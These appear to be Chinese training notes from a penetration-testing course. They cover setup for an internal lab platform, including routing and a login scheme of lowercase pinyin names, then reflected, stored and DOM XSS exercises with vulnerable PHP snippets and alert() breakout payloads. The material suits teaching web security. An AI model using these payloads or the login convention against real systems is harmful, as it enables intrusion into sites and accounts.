

# 多元情报体系系统平台地址

### ip范围

10.223.47.101~10.223.47.130

### ip配置

```bash
10.223.47.114
255.255.255.0
10.223.47.254

114.114.114.114.114
8.8.8.8
```



### 添加路由

删除网关

cmd管理员权限

终端管理员权限永久添加路由

```bash
route -p add 10.223.20.0 mask 255.255.255.0 10.223.47.254 metric 1
```

该路由指定发往**10.223.20.0/24**的流量（10.223.20.0–10.223.20.255 范围内的所有 IP）将通过网关**10.223.47.254**进行路由。

度量值`1`可确保该路由优先于同一目标网络中度量值较高的其他路由。

### 多元情报体系系统平台地址

http://10.223.20.31/

账号和密码是姓名小写全拼



# xss

## xss攻击

### 反射型XSS

#### 第一题

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "欢迎用户".$str."";
?>
```



```
?name=<script>alert('XSS')</script>
```

####  第二题 输入框闭合

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "没有找到和".htmlspecialchars($str)."相关的结果.".'...
```



```bash
?keyword="><script>alert('XSS')</script>
```

#### 第3题

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "没有找到和".htmlspecialchars($str)."相关的结果.".'...
```



### 存储型XSS

存储型：持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。

既然存储在页面我们就可以利用浏览器的工具修改页面元素属性，从而触发

#### 第一题 Referer

```bash
ini_set("display_errors", 0);
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
....留言....
input name="t_ref"  value="'.$str33.'" type="hidden">
```



##### 查看网页源代码

```bash
<input name="t_ref"  value="http://10.223.20.120/" type="hidden">
```

> 尖括号过滤为空，隐藏属性，`t_ref`是Referer

将输入框显示出来，`type='text'`

```bash
" type='text' onclick=alert('XSS')>//
```

![image-20241127111617969](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127111617969.png)

```bash
#鼠标移动
" type='text' onmouseover='alert(1)'>//	
#鼠标点击
" type='text' onclick='javascript:alert(1)'>//
```

#### 第二题 User-Agent

```bash
$str11 = $_SERVER['HTTP_USER_AGENT'];
        $str22 = str_replace(">", "", $str11);
        $str33 = str_replace("<", "", $str22);
        .....其他.....
        input name="t_ua"  value="<?=$str33;?>" type="hidden">

```

##### 查看网页源代码

```bash
<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" type="hidden">
```

> t_ua是User-Agent

发现页面中含有User-Agent内容

```bash
" type='text' onclick='javascript:alert(1)'>\\
```

#### 第三题 Cookie

```bash
function srandom($length) {
    $hash = '';
    $chars = '0123456789';
    $max = strlen($chars) - 1;
    mt_srand((double) microtime() * 1000000);
    for ($i = 0; $i < $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}
$str11=strtolower($_COOKIE["user"]);
if(!$str11){
setcookie("user", "LuanYu-" . srandom(4), time() + 3600);
$str11= strtolower($_COOKIE["user"]);
}

$str22 = str_replace(">", "", $str11);
$str33 = str_replace("<", "", $str22);

.....省略......
if (strpos($str33, 'alert') !== false) {
.....
}
.....
input name="t_cook"  value="<?=$str33;?>" type="hidden">

```

##### 网页源代码

```bash
<input name="t_cook"  value="" type="hidden">
```

`t_cook`是Cookie

```bash
" type='text' onclick=alert('XSS')>//
```

![image-20241127113619006](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127113619006.png)

#### 第四题

```bash
<center><iframe name="leftframe" width=0 height=0 src="./a.php" frameborder=no scrolling="no"></iframe></center>
```



```bash
$str = $_GET["key"];
echo "<h2 align=center>".$str."机密是：".$str11."</h2>";
```



```bash
b.php?key=<script>alert('XSS')</script>
```

![image-20241127125051086](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127125051086.png)

#### 第五题 ng-include

ng-include是 angular js中的东西，其作用相当于php的include函数

##### ng-include的用法

1. 1、ng-include 指令用于包含外部的 HTML文件。
2. 2、包含的内容将作为指定元素的子节点。
3. 3、ng-include 属性的值可以是一个表达式，返回一个文件名。
4. 4、默认情况下，包含的文件需要包含在同一个域名下。

> 值得注意的是：
>
> - ng-include，如果单纯指定地址，必须要加引号
> - ng-include，加载外部html，script标签中的内容不执行
> - ng-include，加载外部html中含有style标签样式可以识别

```bash
#index.php 部分源码：

$str = $_GET["src"];
.....省略......
echo '<span class="ng-include:'.htmlspecialchars($str).'"></span>';

#a.php 部分源码：

ini_set("display_errors", 0);
$str4 = $_GET["name"];
echo "<h2 align=center>用户".$str4."</h2>";
```



```bash
<span class="ng-include:"></span></div>
```

构造好payload:

```bash
index.php?src='a.php?name=<a href="javascript:alert(9)">'
```

### Dom型XSS

#### 第一题

```bash
ini_set("display_errors", 0);
$gc=htmlspecialchars($_GET["arg"]);
```



```bash
<embed id=em src=yp.mp3?gc= loop="15"  autostart="true"/>
```

没有引号，无需闭合

```bash
/index.php?arg=123 onmouseover='alert(1)'
```

#### 第二题

```bash
ini_set("display_errors", 0);
$gc=htmlspecialchars($_GET["arg"]);
```



```bash
<embed id=em src='1537.mp4?gc=' loop="15"  width="800" height="600" autostart="true"/>
<embed id=em src='1537.mp4?gc=<?=$gc?>' loop="15"  width="800" height="600" autostart="true"/>

```

单引号闭合

```bash
?arg=1' onmouseover='alert(1)' '
```

